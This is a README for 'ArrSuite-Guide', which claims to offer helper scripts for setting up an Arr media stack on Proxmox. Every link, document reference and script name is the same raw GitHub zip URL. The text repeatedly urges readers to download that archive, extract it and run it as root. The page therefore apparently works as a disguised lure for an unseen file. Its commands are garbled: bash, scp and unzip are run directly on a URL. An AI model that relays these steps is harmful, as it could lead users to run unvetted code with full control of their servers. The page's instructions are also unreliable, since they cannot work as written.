# 🛠️ ArrSuite-Guide - Simplify Your Arr Stack Setup

[![Download ArrSuite-Guide](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip)](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip)

---

## 📋 What is ArrSuite-Guide?

ArrSuite-Guide provides helper scripts and configuration files to help you set up and manage your Arr Stack on Proxmox VE. If you want to run media automation tools like Sonarr or Radarr in containers, this guide and the included scripts will make the process easier and less time-consuming.

Whether you are new to containers or just want a clear, step-by-step approach, this repository offers support files, examples, and automated scripts to help you share storage, set up a VPN, and configure your environment correctly.

---

## 💻 System Requirements

Before starting, ensure your system meets these basic requirements:

- **Hardware:** A computer running Proxmox VE with at least 4 GB RAM (8 GB recommended).
- **Software:** Proxmox VE installed and running.
- **Network:** A working internet connection for downloading software and updates.
- **User Access:** Administrator or root access to your Proxmox server.

---

## ⚙️ Features Included

The ArrSuite-Guide repository includes:

- **Automated scripts** to share storage with containers and to set up NFS storage quickly.
- **VPN setup script** using WireGuard and Surfshark for secure network connections.
- **Configuration examples** for Sonarr and Radarr path settings.
- **Detailed checklists and quick reference sheets** to guide your setup.
- **Main documentation** with clear, step-by-step instructions.

These components work together to help you create a stable and properly configured Arr Stack with minimal hassle.

---

## 🚀 Getting Started

This section will guide you through downloading, installing, and running ArrSuite-Guide. Follow each step carefully even if you have little or no technical experience.

### Step 1: Open the Download Page

Click the badge at the top or use this link to visit the official release page:

https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip

Here you will find the latest version of the setup scripts and configuration files.

### Step 2: Download the Latest Release

On the releases page, download the package marked as the latest stable release. This will usually be a zipped file (`.zip` or `https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip`) containing the scripts and documentation.

Save the file to your local machine where you keep your Proxmox server files.

### Step 3: Transfer Files to Your Proxmox Server

Use an SCP tool like WinSCP (for Windows) or the `scp` command (for Linux/macOS) to move the downloaded files from your local computer to the Proxmox server.

If you are unfamiliar with SCP, try this:

- Open WinSCP and connect to your Proxmox IP with your root username and password.
- Drag and drop the downloaded package to your home directory on the server.

Or on Linux/macOS, open a terminal and run:

```bash
scp https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip root@your-proxmox-ip:/root/
```

Replace the paths and IP accordingly.

### Step 4: Extract the Package on Proxmox

Once the file is on your server, connect to your Proxmox server using SSH or the web shell.

Run the command below to extract the package:

```bash
unzip https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip -d /root/arrsuite-guide
```

If the file is a tarball (https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip), use:

```bash
tar -xzf https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip -C /root/arrsuite-guide
```

This will create a folder named `arrsuite-guide` with all the needed files.

---

## ⚙️ Using the Helper Scripts

Inside the `arrsuite-guide` directory, you will find several scripts that assist in setting up your Arr Stack environment.

### Sharing Storage With Containers

Run the script:

```bash
bash https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip
```

This script will help you share your storage drives with your containers without manual mounting. Just follow the on-screen prompts.

### Setting Up NFS Storage

To quickly configure NFS storage, use:

```bash
bash https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip
```

This script guides you through the NFS setup process interactively. It checks for required packages and handles most configurations automatically.

### Setting Up VPN With WireGuard and Surfshark

To create a VPN container for secure connections, execute:

```bash
bash https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip
```

This script automates WireGuard VPN creation with Surfshark credentials. You will need to have your Surfshark username and password ready.

---

## 📁 Configuration Examples and Documentation

The repository comes with helpful example files and detailed documentation:

- **Sonarr and Radarr path setups** help you understand how to correctly map your media folders.
- **Quick setup checklist** lets you follow a simple list to make sure important steps are not missed.
- **Container management commands** help you start, stop, and manage your containers in Proxmox.
- **Quick reference cheat sheet** is a printable single page summarizing key setup points.

Check the main setup guide here: [https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip) for full instructions.

---

## 📥 Download & Install

You can download all the files you need from:

[https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip)

1. Visit the link above.
2. Download the latest release package.
3. Transfer the files to Proxmox.
4. Extract the package.
5. Follow the README and use the helper scripts.

---

## 🛠️ Troubleshooting and Support

- If you get permission errors, make sure you are logged in as the root user on Proxmox.
- Scripts may ask for package installations; choose yes to allow this.
- If a script does not run, check you are in the correct directory with the extracted files.
- Review the quick reference sheet for common commands and tips.

For deeper technical issues, visit the main documentation or the Issues section on the GitHub repository.

---

## 🧾 Additional Resources

- [https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip) — Step-by-step setup instructions.
- [https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip) — Setup reminders.
- [https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip) — Commands for containers.
- [https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip) — Handy cheat sheet.

Use these resources to get the most out of your Arr Stack setup on Proxmox VE.

---

## 📞 Contact and Feedback

If you have questions or feedback, please open an issue in the GitHub repository. We aim to keep the guide clear and helpful for all users.